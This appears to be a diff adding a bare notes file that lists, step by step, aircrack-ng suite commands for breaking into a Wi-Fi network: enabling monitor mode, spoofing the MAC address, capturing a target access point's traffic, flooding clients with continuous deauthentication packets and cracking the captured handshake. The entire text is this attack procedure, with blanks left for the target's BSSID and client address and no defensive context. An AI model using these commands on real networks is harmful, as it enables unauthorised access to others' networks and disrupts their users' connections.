@@ -1,0 +1,17 @@
+ifconfig
+airmon-ng
+airmon-ng start wlan0
+ifconfig
+ifconfig mon0 down
+ifconfig
+macchanger -m 00:11:22:33:44:55 mon0
+ifconfig mon0 up
+ifconfig
+airodump-ng mon0
+airodump-ng -c __ --bssid ___ -w filename mon0
+(The file will get stored in the home/root folder with .cap extension)
+
+At another terminal -:
+aireplay-ng -0 0 -a ___ -h ______ --ignore-negative-one mon0 (use -c for specifying a specific client)
+
+aircrack-ng filename-01.cap
